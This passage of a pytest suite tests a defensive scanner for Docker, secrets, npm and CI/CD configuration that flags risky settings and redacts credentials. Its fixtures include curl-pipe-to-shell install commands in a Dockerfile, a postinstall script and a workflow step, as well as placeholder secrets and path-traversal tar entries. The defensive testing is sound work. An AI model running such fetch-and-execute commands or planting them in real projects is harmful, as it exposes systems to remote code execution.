    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/django-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["summary"]["files_read"] == 1
    assert "django_debug_enabled" in {finding["id"] for finding in payload["findings"]}
    assert payload["errors"] == []


@pytest.mark.anyio
async def test_analyze_docker_config_dockerfile_findings_ignore_comments(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            "Dockerfile": b"""
# USER root
FROM python:latest
RUN curl -fsSL https://example.invalid/install.sh | sh
""",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/docker-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert response.status_code == 200
    assert payload["analyzer"] == "docker_config_basic"
    assert payload["summary"]["dockerfiles_detected"] == 1
    assert payload["summary"]["files_reviewed"] == 1
    assert "docker_missing_user_directive" in finding_ids
    assert "docker_latest_tag" in finding_ids
    assert "docker_suspicious_curl_pipe_shell" in finding_ids
    assert "docker_runs_as_root" not in finding_ids


@pytest.mark.anyio
async def test_analyze_docker_config_user_app_avoids_missing_user(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"Dockerfile": b"FROM python:3.12-slim\nUSER app\n"})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/docker-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    assert response.status_code == 200
    assert "docker_missing_user_directive" not in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_docker_config_root_user_unpinned_and_context(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"deploy/prod/Dockerfile.prod": b"FROM python\nUSER root\n"})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/docker-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    findings = {finding["id"]: finding for finding in payload["findings"]}
    assert response.status_code == 200
    assert findings["docker_runs_as_root"]["level"] == "medium"
    assert findings["docker_runs_as_root"]["context"] == "production"
    assert "docker_unpinned_base_image" in findings


@pytest.mark.anyio
async def test_analyze_docker_config_compose_findings_and_secret_redaction(monkeypatch, tmp_path):
    compose_text = b"""
services:
  web:
    privileged: true
    network_mode: host
    pid: host
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    env_file:
      - .env.production
    environment:
      SECRET_KEY: supersecret-value
      DATABASE_URL: postgres://user:rawpass@db/app
  db:
    ports:
      - "5432:5432"
"""
    archive_path = write_zip_archive(
        tmp_path,
        {
            "docker-compose.yml": compose_text,
            ".env.production": b"SECRET_KEY=should-not-be-read\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/docker-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["compose_files_detected"] == 1
    assert payload["summary"]["services_detected"] == 2
    assert "docker_privileged_container" in finding_ids
    assert "docker_host_network" in finding_ids
    assert "docker_host_pid_or_ipc" in finding_ids
    assert "docker_socket_mount" in finding_ids
    assert "docker_published_database_port" in finding_ids
    assert "docker_env_file_real_reference" in finding_ids
    assert "docker_sensitive_env_name" in finding_ids
    assert "supersecret-value" not in serialized
    assert "rawpass" not in serialized
    assert "should-not-be-read" not in serialized
    assert "[REDACTED]" in serialized


@pytest.mark.anyio
async def test_analyze_docker_config_lower_confidence_context_degrades_severity(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"examples/Dockerfile": b"FROM python\nUSER root\n"})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/docker-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    runs_as_root = next(finding for finding in payload["findings"] if finding["id"] == "docker_runs_as_root")
    unpinned = next(finding for finding in payload["findings"] if finding["id"] == "docker_unpinned_base_image")
    assert response.status_code == 200
    assert runs_as_root["context"] == "example"
    assert runs_as_root["level"] == "low"
    assert unpinned["level"] == "info"


@pytest.mark.anyio
async def test_analyze_docker_config_skips_path_traversal(monkeypatch, tmp_path):
    archive_path = write_zip_archive(tmp_path, {"../Dockerfile": b"FROM python:latest\n"})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/docker-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    assert response.status_code == 200
    assert payload["files_detected"][0]["read"] is False
    assert payload["files_detected"][0]["skip_reason"] == "path_traversal"
    assert "docker_config_path_traversal" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_docker_config_tar_skips_symlink_and_hardlink(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        link_info = tarfile.TarInfo("Dockerfile")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real.Dockerfile"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("compose.prod.yml")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-compose.yml"
        archive.addfile(hardlink_info)

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/docker-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    assert response.status_code == 200
    assert {item["skip_reason"] for item in payload["files_detected"]} == {"not_regular_file:symlink", "not_regular_file:hardlink"}
    assert "docker_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}


@pytest.mark.anyio
async def test_analyze_docker_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "DOCKER_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "DOCKER_CONFIG_MAX_FILE_BYTES", 40)
    monkeypatch.setattr(runner, "DOCKER_CONFIG_MAX_TOTAL_BYTES", 80)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "Dockerfile": b"FROM python:3.12\n",
            "Dockerfile.large": b"FROM python:3.12\nRUN " + b"x" * 80 + b"\n",
            "docker-compose.yml": b"services:\n  web:\n    image: app\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/docker-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons


@pytest.mark.anyio
async def test_analyze_secrets_review_detects_real_env_files_without_reading(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            ".env": b"SECRET_KEY=root-env-secret-123\n",
            ".env.production": b"DATABASE_URL=postgres://user:prod-pass@db/app\n",
            "config/.env.local": b"TOKEN=local-token-secret-123\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/secrets-review",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["analyzer"] == "secrets_review_basic"
    assert payload["summary"]["sensitive_files_detected"] == 3
    assert {item["skip_reason"] for item in payload["sensitive_files"]} == {"real_env_file_not_read"}
    assert all(item["read"] is False for item in payload["sensitive_files"])
    assert "real_env_file_present_not_read" in {finding["id"] for finding in payload["findings"]}
    assert "root-env-secret-123" not in serialized
    assert "prod-pass" not in serialized
    assert "local-token-secret-123" not in serialized


@pytest.mark.anyio
async def test_analyze_secrets_review_reads_env_templates_with_redacted_evidence(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            ".env.example": b"SECRET_KEY=env-example-secret-value-123\n",
            ".env.template": b"PASSWORD=changeme\n",
            "env.sample": b"API_KEY=example\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/secrets-review",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    findings = {finding["id"]: finding for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 3
    assert "secret_like_assignment" in findings
    assert "weak_placeholder_secret" in findings
    assert "SECRET_KEY=[REDACTED]" in serialized
    assert "env-example-secret-value-123" not in serialized
    assert "changeme" not in serialized


@pytest.mark.anyio
async def test_analyze_secrets_review_redacts_urls_tokens_private_keys_and_comments(monkeypatch, tmp_path):
    private_key = b"""-----BEGIN PRIVATE KEY-----
MIIEvprivate-key-material-that-must-not-appear
-----END PRIVATE KEY-----
"""
    settings_text = (
        b"# SECRET_KEY=comment-only-secret\n"
        b"DATABASE_URL=postgres://user:db-pass-secret@db/app\n"
        b"REDIS_URL=redis://:redis-pass-secret@redis:6379/0\n"
        b"CALLBACK_URL=https://api-user:web-pass-secret@example.com/path\n"
        b"JWT_TOKEN=aaaaaaaaaa.bbbbbbbbbb.cccccccccc\n"
        b"DEBUG_NOTE=eyJhbGciOiJIUzI1NiJ9.fixture.fixture\n"
    ) + private_key
    archive_path = write_zip_archive(tmp_path, {"settings.py": settings_text})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/secrets-review",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "database_url_with_credentials" in finding_ids
    assert "redis_url_with_credentials" in finding_ids
    assert "basic_auth_url" in finding_ids
    assert "jwt_like_value" in finding_ids
    assert "private_key_block_detected" in finding_ids
    assert "PRIVATE_KEY_BLOCK_REDACTED" in serialized
    assert "comment-only-secret" not in serialized
    assert "db-pass-secret" not in serialized
    assert "redis-pass-secret" not in serialized
    assert "web-pass-secret" not in serialized
    assert "private-key-material-that-must-not-appear" not in serialized
    assert "aaaaaaaaaa.bbbbbbbbbb.cccccccccc" not in serialized
    assert "eyJhbGciOiJIUzI1NiJ9.fixture.fixture" not in serialized


@pytest.mark.anyio
async def test_analyze_secrets_review_contextual_findings_are_redacted(monkeypatch, tmp_path):
    archive_path = write_zip_archive(
        tmp_path,
        {
            ".github/workflows/deploy.yml": b"env:\n  TOKEN: ci-token-secret-123\n",
            "docker-compose.yml": b"services:\n  web:\n    environment:\n      PASSWORD: compose-pass-secret-123\n",
            "Dockerfile": b"FROM python:3.12\nARG SECRET_KEY=docker-secret-value-123\n",
            "k8s/secret.yaml": b"apiVersion: v1\nkind: Secret\nstringData:\n  password: k8s-pass-secret-123\n",
            "infra/main.tf": b'variable "db_password" {\n  default = "terraform-pass-secret-123"\n}\n',
            "examples/config.py": b"EXAMPLE_ONLY_API_KEY=example-context-secret-123\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/secrets-review",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    example_finding = next(
        finding for finding in payload["findings"] if finding.get("file_path") == "examples/config.py" and finding["id"] == "secret_like_assignment"
    )
    assert response.status_code == 200
    assert "ci_secret_exposed_inline" in finding_ids
    assert "secret_in_compose_environment" in finding_ids
    assert "secret_in_docker_build_arg" in finding_ids
    assert "secret_in_k8s_manifest_plaintext" in finding_ids
    assert "secret_in_terraform_variable_default" in finding_ids
    assert example_finding["context"] == "example"
    assert example_finding["level"] == "low"
    assert example_finding["confidence"] == "low"
    assert "ci-token-secret-123" not in serialized
    assert "compose-pass-secret-123" not in serialized
    assert "docker-secret-value-123" not in serialized
    assert "k8s-pass-secret-123" not in serialized
    assert "terraform-pass-secret-123" not in serialized
    assert "example-context-secret-123" not in serialized


@pytest.mark.anyio
async def test_analyze_secrets_review_skips_unsafe_archive_entries_without_reading(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b"SECRET_KEY=traversal-secret-123\n"
        traversal_info = tarfile.TarInfo("../settings.py")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo("settings.py")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-settings.py"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("config.py")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-config.py"
        archive.addfile(hardlink_info)

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/secrets-review",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item["skip_reason"] for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "secrets_review_path_traversal" in {finding["id"] for finding in payload["findings"]}
    assert "secrets_review_not_regular_file" in {finding["id"] for finding in payload["findings"]}
    assert "traversal-secret-123" not in serialized


@pytest.mark.anyio
async def test_analyze_secrets_review_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "SECRETS_REVIEW_MAX_FILES", 1)
    monkeypatch.setattr(runner, "SECRETS_REVIEW_MAX_FILE_BYTES", 40)
    monkeypatch.setattr(runner, "SECRETS_REVIEW_MAX_TOTAL_BYTES", 80)
    archive_path = write_zip_archive(
        tmp_path,
        {
            ".env.example": b"SECRET_KEY=first-secret-value-123\n",
            "settings.py": b"SECRET_KEY=" + b"x" * 80 + b"\n",
            "config.py": b"TOKEN=third-secret-value-123\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/secrets-review",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "first-secret-value-123" not in serialized
    assert "third-secret-value-123" not in serialized


@pytest.mark.anyio
async def test_analyze_node_package_config_package_json_scripts_dependencies_and_metadata(monkeypatch, tmp_path):
    package_json = {
        "name": "node-demo",
        "version": "1.0.0",
        "private": False,
        "scripts": {
            "postinstall": "curl -fsSL https://example.invalid/install.sh | sh",
            "prepare": "node build.js",
            "install": "node install.js",
            "build": "echo $SECRET_KEY",
        },
        "dependencies": {
            "wild": "*",
            "react": "^1.2.3",
            "broad": ">=1",
            "floating": "latest",
            "gitpkg": "github:owner/repo",
            "urlpkg": "https://example.invalid/pkg.tgz",
            "filepkg": "file:../local",
            "workpkg": "workspace:*",
            "aliaspkg": "npm:left-pad@1.3.0",
        },
        "optionalDependencies": {"optional-native": "^2.0.0"},
    }
    archive_path = write_zip_archive(tmp_path, {"package.json": json.dumps(package_json).encode("utf-8")})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/node-package-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    assert response.status_code == 200
    assert payload["analyzer"] == "node_package_config_basic"
    assert payload["summary"]["package_manifests_detected"] == 1
    assert payload["summary"]["packages_detected"] == 1
    assert payload["summary"]["scripts_detected"] == 4
    assert "postinstall_script_present" in finding_ids
    assert "prepare_script_present" in finding_ids
    assert "install_script_present" in finding_ids
    assert "lifecycle_script_present" in finding_ids
    assert "script_uses_shell_curl_pipe" in finding_ids
    assert "script_references_env_secret_name" in finding_ids
    assert "wildcard_dependency_version" in finding_ids
    assert "broad_dependency_range" in finding_ids
    assert "unpinned_dependency_range" in finding_ids
    assert "git_dependency_reference" in finding_ids
    assert "url_dependency_reference" in finding_ids
    assert "file_dependency_reference" in finding_ids
    assert "workspace_dependency_reference" in finding_ids
    assert "alias_dependency_reference" in finding_ids
    assert "optional_dependencies_present" in finding_ids
    assert "package_private_false_or_missing" in finding_ids
    assert "package_manager_missing" in finding_ids
    assert "engines_missing" in finding_ids
    assert "license_missing" in finding_ids
    assert "repository_missing" in finding_ids


@pytest.mark.anyio
async def test_analyze_node_package_config_npmrc_redacts_tokens_and_flags(monkeypatch, tmp_path):
    npmrc = b"""
# //registry.npmjs.org/:_authToken=comment-token-should-not-appear
registry=https://user:registry-pass-secret@registry.example.invalid/
//registry.npmjs.org/:_authToken=fixture-token
strict-ssl=false
unsafe-perm=true
ignore-scripts=true
"""
    archive_path = write_zip_archive(tmp_path, {".npmrc": npmrc})
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/node-package-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["package_manager_configs_detected"] == 1
    assert "npmrc_token_reference_detected" in finding_ids
    assert "npmrc_registry_override" in finding_ids
    assert "npmrc_strict_ssl_disabled" in finding_ids
    assert "npmrc_unsafe_perm_enabled" in finding_ids
    assert "npmrc_ignore_scripts_configured" in finding_ids
    assert "fixture-token" not in serialized
    assert "registry-pass-secret" not in serialized
    assert "comment-token-should-not-appear" not in serialized
    assert "[REDACTED]" in serialized


@pytest.mark.anyio
async def test_analyze_node_package_config_lockfiles_env_and_binary_skips(monkeypatch, tmp_path):
    package_json = {
        "name": "node-demo",
        "private": True,
        "packageManager": "pnpm@9.0.0",
        "engines": {"node": ">=20"},
        "license": "MIT",
        "repository": {"type": "git", "url": "https://example.invalid/repo.git"},
    }
    archive_path = write_zip_archive(
        tmp_path,
        {
            "package.json": json.dumps(package_json).encode("utf-8"),
            "package-lock.json": b'{"lockfileVersion": 3}\n',
            "yarn.lock": b"# yarn lockfile\n",
            "bun.lockb": b"\x00bun-binary-lock\n",
            ".env.production": b"NPM_TOKEN=env-token-should-not-be-read\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/node-package-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    skip_reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["lockfiles_detected"] == 3
    assert "package_lock_present" in finding_ids
    assert "multiple_lockfiles_present" in finding_ids
    assert "package_manager_mismatch" in finding_ids
    assert "node_package_config_real_env_file_not_read" in finding_ids
    assert "node_package_config_binary_lockfile_not_read" in finding_ids
    assert "real_env_file_not_read" in skip_reasons
    assert "binary_lockfile_not_read" in skip_reasons
    assert "env-token-should-not-be-read" not in serialized


@pytest.mark.anyio
async def test_analyze_node_package_config_js_ts_hints_comments_and_context(monkeypatch, tmp_path):
    package_json = {"name": "example-node-demo", "scripts": {"postinstall": "node setup.js"}}
    archive_path = write_zip_archive(
        tmp_path,
        {
            "examples/package.json": json.dumps(package_json).encode("utf-8"),
            "vite.config.ts": b"// server: { host: '0.0.0.0' }\nexport default {}\n",
            "webpack.config.js": b"module.exports = { devServer: { host: '0.0.0.0' }, devtool: 'source-map' }\n",
            "tsconfig.json": b'{"compilerOptions": {"skipLibCheck": true}}\n',
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/node-package-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    findings = {finding["id"]: finding for finding in payload["findings"]}
    postinstall = next(finding for finding in payload["findings"] if finding["id"] == "postinstall_script_present")
    assert response.status_code == 200
    assert postinstall["context"] == "example"
    assert postinstall["level"] == "info"
    assert "vite_dev_host_exposed_hint" not in findings
    assert "webpack_dev_server_exposed_hint" in findings
    assert "tsconfig_skip_lib_check_hint" in findings
    assert "source_maps_enabled_hint" in findings


@pytest.mark.anyio
async def test_analyze_node_package_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b'{"scripts":{"postinstall":"echo traversal-secret"}}\n'
        traversal_info = tarfile.TarInfo("../package.json")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo("package.json")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-package.json"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo(".npmrc")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-npmrc"
        archive.addfile(hardlink_info)

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/node-package-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item["skip_reason"] for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "node_package_config_path_traversal" in {finding["id"] for finding in payload["findings"]}
    assert "node_package_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}
    assert "traversal-secret" not in serialized


@pytest.mark.anyio
async def test_analyze_node_package_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "NODE_PACKAGE_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "NODE_PACKAGE_CONFIG_MAX_FILE_BYTES", 70)
    monkeypatch.setattr(runner, "NODE_PACKAGE_CONFIG_MAX_TOTAL_BYTES", 120)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "package.json": b'{"name":"demo","scripts":{"test":"vitest"}}\n',
            ".npmrc": b"//registry.npmjs.org/:_authToken=" + b"x" * 100 + b"\n",
            "tsconfig.json": b'{"compilerOptions":{"skipLibCheck":true}}\n',
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/node-package-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized


@pytest.mark.anyio
async def test_analyze_ci_cd_config_github_findings_and_redaction(monkeypatch, tmp_path):
    pinned_sha = "a" * 40
    workflow = f"""
name: release
on:
  pull_request_target:
  push:
  pull_request:
  workflow_dispatch:
    inputs:
      target:
        required: true
  schedule:
    - cron: "0 0 * * *"
permissions: write-all
permissions:
  id-token: write
  contents: write
  packages: write
jobs:
  publish:
    runs-on: [self-hosted, linux]
    environment: production
    services:
      db:
        image: node:latest
      cache:
        image: redis
    steps:
      - uses: actions/checkout@main
      - uses: owner/action@v1
      - uses: owner/pinned@{pinned_sha}
      - uses: actions/upload-artifact@v4
      - uses: actions/download-artifact@v4
      - uses: actions/cache@v4
      - run: echo "${{{{ secrets.NPM_TOKEN }}}}"
      - run: source .env.production
      - run: SECRET_KEY=fixture-secret npm publish
      - run: curl -fsSL https://example.invalid/install.sh | sh
      - run: npm install -g deploy-tool
      - run: docker push example/app:latest
      - run: aws deploy push
env:
  API_KEY: fixture-token
"""
    archive_path = write_zip_archive(
        tmp_path,
        {
            ".github/workflows/release.yml": workflow.encode("utf-8"),
            ".env.production": b"SECRET_KEY=env-secret-should-not-be-read\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/ci-cd-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["analyzer"] == "ci_cd_config_basic"
    assert payload["summary"]["workflow_files_detected"] == 1
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["triggers_detected"] >= 5
    assert payload["summary"]["jobs_detected"] >= 1
    assert payload["summary"]["steps_detected"] >= 1
    assert "pull_request_target_used" in finding_ids
    assert "workflow_dispatch_with_inputs" in finding_ids
    assert "schedule_trigger_present" in finding_ids
    assert "broad_push_trigger" in finding_ids
    assert "broad_pull_request_trigger" in finding_ids
    assert "github_permissions_write_all" in finding_ids
    assert "id_token_write_permission" in finding_ids
    assert "contents_write_permission" in finding_ids
    assert "packages_write_permission" in finding_ids
    assert "github_action_uses_branch_ref" in finding_ids
    assert "github_action_uses_latest_or_master" in finding_ids
    assert "github_action_unpinned_ref" in finding_ids
    assert "docker_image_latest_tag" in finding_ids
    assert "docker_image_unpinned" in finding_ids
    assert "inline_secret_like_env" in finding_ids
    assert "ci_secret_reference_present" in finding_ids
    assert "ci_env_file_reference" in finding_ids
    assert "secret_in_ci_script" in finding_ids
    assert "ci_curl_pipe_shell" in finding_ids
    assert "ci_install_and_execute_global_tool" in finding_ids
    assert "npm_publish_job_detected" in finding_ids
    assert "docker_push_job_detected" in finding_ids
    assert "cloud_deploy_job_detected" in finding_ids
    assert "production_environment_deploy" in finding_ids
    assert "self_hosted_runner_used" in finding_ids
    assert "ci_artifact_upload_present" in finding_ids
    assert "ci_artifact_download_present" in finding_ids
    assert "ci_cache_key_broad" in finding_ids
    assert "ci_cd_config_real_env_file_not_read" in finding_ids
    assert "fixture-secret" not in serialized
